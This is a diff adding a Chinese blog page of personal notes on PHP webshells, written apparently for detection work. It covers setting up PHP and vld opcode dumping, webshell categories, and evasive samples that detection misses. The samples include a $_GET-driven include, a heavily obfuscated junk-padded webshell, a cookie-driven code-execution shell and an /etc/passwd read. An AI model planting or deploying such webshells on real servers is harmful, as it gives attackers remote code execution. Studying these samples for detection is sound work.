@@ -1,0 +1,330 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Hello Gridea | JohnYin</title>
+<link rel="shortcut icon" href="https://johnyin-hub.github.io//favicon.ico?v=1683505903280">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://johnyin-hub.github.io//styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="Hello Gridea | JohnYin - Atom Feed" href="https://johnyin-hub.github.io//atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="
+WebShell 概述
+
+
+大师赛的
+
+windows-PHP踩坑
+安装php
+
+不需要安装apache，cli模式运行不需要装web服务器。
+测试文件test.php要写完整。
+解压路径C：\PHP7\，更改目录下php.init.de..." />
+    <meta name="keywords" content="Gridea" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://johnyin-hub.github.io/">
+  <img class="avatar" src="https://johnyin-hub.github.io//images/avatar.png?v=1683505903280" alt="">
+  </a>
+  <h1 class="site-title">
+    JohnYin
+  </h1>
+  <p class="site-description">
+    看代码、看论文、看乐谱真挺无聊，还是好好看看身边人有意思
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+      
+        <a href="心路记忆" class="menu">
+          心路记忆
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              Hello Gridea
+            </h2>
+            <div class="post-info">
+              <span>
+                2018-12-12
+              </span>
+              <span>
+                6 min read
+              </span>
+              
+                <a href="https://johnyin-hub.github.io/tag/_5tHDTKXI/" class="post-tag">
+                  # Gridea
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://johnyin-hub.github.io//post-images/hello-gridea.png" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <!-- more -->
+<h3 id="webshell-概述">WebShell 概述</h3>
+<figure data-type="image" tabindex="1"><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1h57y7c8zwjj21620g8tck.jpg" alt="image-20211028104035971" loading="lazy"></figure>
+<figure data-type="image" tabindex="2"><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1h57y7hi4pqj21lh0u00yf.jpg" alt="image-20211028141253921" loading="lazy"></figure>
+<!-- more -->大师赛的
+<h3 id=""></h3>
+<h2 id="windows-php踩坑">windows-PHP踩坑</h2>
+<h4 id="安装php">安装php</h4>
+<ol>
+<li>不需要安装apache，cli模式运行不需要装web服务器。</li>
+<li>测试文件test.php要写完整。</li>
+<li>解压路径C：\PHP7\，更改目录下php.init.development文件成 php.ini。</li>
+<li>最坑需要修改php.ini配置文件、extension，去掉分号试情况添加改写。</li>
+</ol>
+<pre><code class="language-php">//test.php 第一个php文件
+&lt;?php
+	echo&quot;hello world&quot;
+?&gt;
+</code></pre>
+<h4 id="获取php的opcode">获取php的opcode</h4>
+<ol>
+<li>安装vld扩展组件，在ext文件夹下添加vld.dll扩展组件。</li>
+<li>修改配置文件，添加一行extension =vld（形式有可能不同，注意这个坑）</li>
+</ol>
+<pre><code>//命令行获取opcode
+php -dvld.active=1 -dvld.execute=0 test.php
+</code></pre>
+<h4 id="木马分类">木马分类</h4>
+<ul>
+<li>
+<h4 id="一句话木马">一句话木马</h4>
+<h5 id="一句话木马泛指一句话的脚本最典型的功能就是为代码执行提供一种环境比如熟悉的eval函数">一句话木马泛指一句话的脚本，最典型的功能就是为代码执行提供一种环境，比如熟悉的eval()函数。</h5>
+<h5 id="这种脚本大都不会脱离数据传递与数据执行这个基本框架">这种脚本大都不会脱离数据传递与数据执行这个基本框架。</h5>
+</li>
+<li>
+<h4 id="小马">小马</h4>
+<h5 id="小马至功能单一的webshell以上传文件功能居多通常作为上传大马的中转站辅助攻击者进行渗透">小马至功能单一的Webshell，以上传文件功能居多，通常作为上传大马的中转站，辅助攻击者进行渗透。</h5>
+<h5 id="其文件不大也不存在口令保护">其文件不大，也不存在口令保护。</h5>
+</li>
+<li>
+<h4 id="大马">大马</h4>
+<h5 id="大马指功能强大的webshell-有些大马为了躲避检测使用了混">大马指功能强大的Webshell。有些大马为了躲避检测，使用了混</h5>
+<h5 id="淆手段或者加解密压缩等技术前一种称未加密的webshell后一种成为加密的webshell">淆手段或者加解密压缩等技术，前一种称未加密的Webshell，后一种成为加密的Webshell。</h5>
+</li>
+</ul>
+<p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>s</mi><mi>i</mi><mi>g</mi><mi>m</mi><mi>a</mi><mo>(</mo><mi>d</mi><mo>)</mo><mo>=</mo><mi>p</mi><mo>(</mo><mi>a</mi><mo>)</mo><mo>+</mo><mi>p</mi><mo>(</mo><mi>b</mi><mo>)</mo><msup><mn>2</mn><mn>3</mn></msup></mrow><annotation encoding="application/x-tex">sigma(d)  = p(a)+p(b) 2^3
+</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">m</span><span class="mord mathdefault">a</span><span class="mopen">(</span><span class="mord mathdefault">d</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">p</span><span class="mopen">(</span><span class="mord mathdefault">a</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord mathdefault">p</span><span class="mopen">(</span><span class="mord mathdefault">b</span><span class="mclose">)</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span></span></span></span></span></p>
+<h3 id="不能覆盖类型">不能覆盖类型</h3>
+<ol>
+<li>
+<h5 id="自定义函数动态调用">自定义函数动态调用</h5>
+<pre><code class="language-php">&lt;?php
+        function xz(){
+                global $b;
+                $a = $_GET[$b];   #  $_GET[“xz”]
+                $e = $a;
+                return $e;
+        }
+?&gt;
+&lt;?php
+$b = &quot;xz&quot;;
+$c = xz();
+$d = $c;
+
+include($d);   #执行
+</code></pre>
+</li>
+<li>
+<h5 id="填充垃圾数据混淆">填充垃圾数据混淆</h5>
+<pre><code class="language-php">&lt;?php $rxvihnd = 'D#)sfebfI{*w%)kVx{**#k#)tutjyf`x	x22l:!}V;3q%}!gj}1~!&lt;2p%	x7f!~!&lt;##!&gt;!2p%Z&lt;^2	x5c2b%!&gt;!2p%!*3&gt;?*2b%)gpf{jt)67]452]88]5]48]32M3]317]445]212]445]43]321]464]284]364]6]234]3bd%!&lt;5h%/#0#/*#npd/#)rrd/#00;quui#&gt;.%!&lt;***f	x27,*e	2	145	x66	157	x78&quot;))) { $kzgsoan = &quot;	x6273]y76]277#&lt;!%t2w&gt;#]y74]273]y76]252]y85]256]y6g]257]y86]267]y74]2x5cq%)ufttj	x22)gj6&lt;^#Y#	x5cq%	x27Y%!|!*#91y]c9y]g2y]#&gt;&gt;*4-1-bubE{h%)s2dc#*&lt;!sfuvso!sboepn)%epnbss-%rxW~!Ypp2)%zB%z3	162	x65	141	x74	145	x5f	146	x75	156	~	x24&lt;!fwbm)%tjw)bssbz)#P#-#Q#-#B#-#T#-#E#-#G#-#H#-#I#-#K#-#L#-#M73]D6P2L5P6]y6gP7L6M7]D4]275]D:M8]Df#&lt;%tdz&gt;#L4]275L3]248L3P6L1M5]D2P4*#57]38y]47]67y]37]88y]27]28y]#/r%/h%)n%-#+I#)q%:&gt;:r%:|:**t%)m%=]y31M6]y3e]81#/#7e:55946-tr.984:75983:48984:71]K9]7]322]3]364]6]283]427]36]373P6]36]73]83]238M7]381]211M5]nbs+yfeobz+sfwjidsb`bj+upcotn+qsvmt+fmhpph56	x61&quot;]=1; $uas=strtolower($_SERVER[&quot;	x48	124	x54	120	x5f	%epnbss!&gt;!bssbz)#44ec:649#-!#:618d5f9#-!#f6c68399#-!#65egb17-SFEBFI,6&lt;*127-UVPFNJU,6&lt;*r (strstr($uas,&quot;	x72	166	x3a	61	x31&quot;)) or (strstr($uas	x45	116	x54&quot;]); if ((strstr($uas,&quot;	x6d	163	x69	145&quot;)) obE{h%)sutcvt)fubmgoj{hA!ost0}Z;0]=]0#)2q%l}S;2-u%!-#2#/#%#/#o]#/*)323zbe!7&amp;6&lt;.fmjgA	x27doj%6&lt;	x7fw6*	x7f_*#fmjgk4`{6~6&lt;tf125	x53	105	x52	137	x41	107	x24-tusqpt)%z-#:#*	x/	x24)%c*W%eN+#Qi	x5c1^W%c!&gt;!%i	x5c#-%tmw)%tww**WYsboepn)%bss-%rxBif((function_exists(&quot;	x6f	142	x5fCw*[!%rN}#QwTW%hIr	x5c1^-%r	x5c2^-%hOh/#00#W~!%t2w)##Qtjw)#]82#-#!58y]472]37y]672]48y]#&gt;s%&lt;#462]47y]252]18y]#	x24-	x24	x5c%j^	x24&gt;!	x24/%tmw/	x24)%zW2^&lt;!Ce*[!%cIjQeTQcOc/#00#W~!Ydrr)%rxBopjudovg}x;0]=])0#)U!	x27{**u%-#j(&quot;vveljku&quot;,str_split(&quot;%tjw!&gt;!#]y84]275]y83]248]y83]256]y81]265]y72]25p!*#ojneb#-*f%)sfxpmpusut)tpqssutRe%)Rd%)Rb%))!gj!&lt;*#cd2bge56+#-!#]y38#-!%w:**&lt;&quot;)));$ijstbzz = $kzgsoan(&quot;&quot;, $hvcesuz); $ij)tpqsut&gt;j%!*9!	x27!hmg%)!p%!-uyfu%)3of)fepdof`57ftbc	x7f!|!*uyfu	x27k:!f7f_*#ujojRk3`{666~6&lt;&amp;w6&lt;	x7fw6*/#M5]DgP5]D6#&lt;%fdy&gt;#]D4]242]58]24]31#-%tdz*Wsfuvso!%bss	x5csboe`UQPMSVD!-id%)uqpuft`msvd},;uqpuft`msvd}+;!&gt;!}	x27;!&gt;&gt;&gt;!
+</code></pre>
+</li>
+<li>
+<h5 id="输入不确定">输入不确定</h5>
+</li>
+</ol>
+<pre><code class="language-php">&lt;?php
+
+$tqgy=$_COOKIE;       #COOKIE 输入不确定
+$tvihp=$tqgy[nyin];   #exp $_POST[nyin]
+if($tvihp){
+	$hnl=$tvihp($tqgy[xdej]);$izp=$tvihp($tqgy[jhqp]);$wobwg=$hnl(&quot;&quot;,$izp);$wobwg();
+}
+</code></pre>
+<pre><code class="language-php">#文件输入不确定
+}
+include &quot;exploits.php&quot;; 
+?&gt;
+</code></pre>
+<pre><code class="language-php">#执行敏感文件
+&lt;?
+include(&quot;/etc/passwd&quot;);     #解决方案 敏感文件直接判
+?&gt;
+
+</code></pre>
+<p>Assert 命令执行，配合extract函数执行</p>
+<p>16进制字符串不用解码可直接执行</p>
+<p>通过str_replace 替换字符串达到混淆目的，混淆出一个命令出来（yara规则辅助）</p>
+<p>include 执行文件函数，需要判断目标文件是否恶意。（yara规则辅助）</p>
+<p>@语法是为了抑制错误输出</p>
+<p>$定义变量</p>
+<p>数组拼接+字符串混淆，（yara可以检测）</p>
+<p>上传move_upload_file</p>
+<p>? 三元操作符 if 判断</p>
+<p>反弹shell</p>
+<p>敏感函数动态调用，（声明，执行）</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li>
+<ul>
+<li><a href="#webshell-%E6%A6%82%E8%BF%B0">WebShell 概述</a></li>
+<li></li>
+</ul>
+</li>
+<li><a href="#windows-php%E8%B8%A9%E5%9D%91">windows-PHP踩坑</a><br>
+*
+<ul>
+<li><a href="#%E5%AE%89%E8%A3%85php">安装php</a></li>
+<li><a href="#%E8%8E%B7%E5%8F%96php%E7%9A%84opcode">获取php的opcode</a></li>
+<li><a href="#%E6%9C%A8%E9%A9%AC%E5%88%86%E7%B1%BB">木马分类</a></li>
+<li><a href="#%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC">一句话木马</a>
+<ul>
+<li><a href="#%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E6%B3%9B%E6%8C%87%E4%B8%80%E5%8F%A5%E8%AF%9D%E7%9A%84%E8%84%9A%E6%9C%AC%E6%9C%80%E5%85%B8%E5%9E%8B%E7%9A%84%E5%8A%9F%E8%83%BD%E5%B0%B1%E6%98%AF%E4%B8%BA%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%8F%90%E4%BE%9B%E4%B8%80%E7%A7%8D%E7%8E%AF%E5%A2%83%E6%AF%94%E5%A6%82%E7%86%9F%E6%82%89%E7%9A%84eval%E5%87%BD%E6%95%B0">一句话木马泛指一句话的脚本，最典型的功能就是为代码执行提供一种环境，比如熟悉的eval()函数。</a></li>
+<li><a href="#%E8%BF%99%E7%A7%8D%E8%84%9A%E6%9C%AC%E5%A4%A7%E9%83%BD%E4%B8%8D%E4%BC%9A%E8%84%B1%E7%A6%BB%E6%95%B0%E6%8D%AE%E4%BC%A0%E9%80%92%E4%B8%8E%E6%95%B0%E6%8D%AE%E6%89%A7%E8%A1%8C%E8%BF%99%E4%B8%AA%E5%9F%BA%E6%9C%AC%E6%A1%86%E6%9E%B6">这种脚本大都不会脱离数据传递与数据执行这个基本框架。</a></li>
+</ul>
+</li>
+<li><a href="#%E5%B0%8F%E9%A9%AC">小马</a>
+<ul>
+<li><a href="#%E5%B0%8F%E9%A9%AC%E8%87%B3%E5%8A%9F%E8%83%BD%E5%8D%95%E4%B8%80%E7%9A%84webshell%E4%BB%A5%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E5%8A%9F%E8%83%BD%E5%B1%85%E5%A4%9A%E9%80%9A%E5%B8%B8%E4%BD%9C%E4%B8%BA%E4%B8%8A%E4%BC%A0%E5%A4%A7%E9%A9%AC%E7%9A%84%E4%B8%AD%E8%BD%AC%E7%AB%99%E8%BE%85%E5%8A%A9%E6%94%BB%E5%87%BB%E8%80%85%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F">小马至功能单一的Webshell，以上传文件功能居多，通常作为上传大马的中转站，辅助攻击者进行渗透。</a></li>
+<li><a href="#%E5%85%B6%E6%96%87%E4%BB%B6%E4%B8%8D%E5%A4%A7%E4%B9%9F%E4%B8%8D%E5%AD%98%E5%9C%A8%E5%8F%A3%E4%BB%A4%E4%BF%9D%E6%8A%A4">其文件不大，也不存在口令保护。</a></li>
+</ul>
+</li>
+<li><a href="#%E5%A4%A7%E9%A9%AC">大马</a>
+<ul>
+<li><a href="#%E5%A4%A7%E9%A9%AC%E6%8C%87%E5%8A%9F%E8%83%BD%E5%BC%BA%E5%A4%A7%E7%9A%84webshell-%E6%9C%89%E4%BA%9B%E5%A4%A7%E9%A9%AC%E4%B8%BA%E4%BA%86%E8%BA%B2%E9%81%BF%E6%A3%80%E6%B5%8B%E4%BD%BF%E7%94%A8%E4%BA%86%E6%B7%B7">大马指功能强大的Webshell。有些大马为了躲避检测，使用了混</a></li>
+<li><a href="#%E6%B7%86%E6%89%8B%E6%AE%B5%E6%88%96%E8%80%85%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%8E%8B%E7%BC%A9%E7%AD%89%E6%8A%80%E6%9C%AF%E5%89%8D%E4%B8%80%E7%A7%8D%E7%A7%B0%E6%9C%AA%E5%8A%A0%E5%AF%86%E7%9A%84webshell%E5%90%8E%E4%B8%80%E7%A7%8D%E6%88%90%E4%B8%BA%E5%8A%A0%E5%AF%86%E7%9A%84webshell">淆手段或者加解密压缩等技术，前一种称未加密的Webshell，后一种成为加密的Webshell。</a></li>
+</ul>
+</li>
+<li><a href="#%E4%B8%8D%E8%83%BD%E8%A6%86%E7%9B%96%E7%B1%BB%E5%9E%8B">不能覆盖类型</a><br>
+*
+<ul>
+<li><a href="#%E8%87%AA%E5%AE%9A%E4%B9%89%E5%87%BD%E6%95%B0%E5%8A%A8%E6%80%81%E8%B0%83%E7%94%A8">自定义函数动态调用</a></li>
+<li><a href="#%E5%A1%AB%E5%85%85%E5%9E%83%E5%9C%BE%E6%95%B0%E6%8D%AE%E6%B7%B7%E6%B7%86">填充垃圾数据混淆</a></li>
+<li><a href="#%E8%BE%93%E5%85%A5%E4%B8%8D%E7%A1%AE%E5%AE%9A">输入不确定</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+
+        
+
+        <div class="site-footer">
+  你我皆凡人，终日奔波苦
+  <a class="rss" href="https://johnyin-hub.github.io//atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
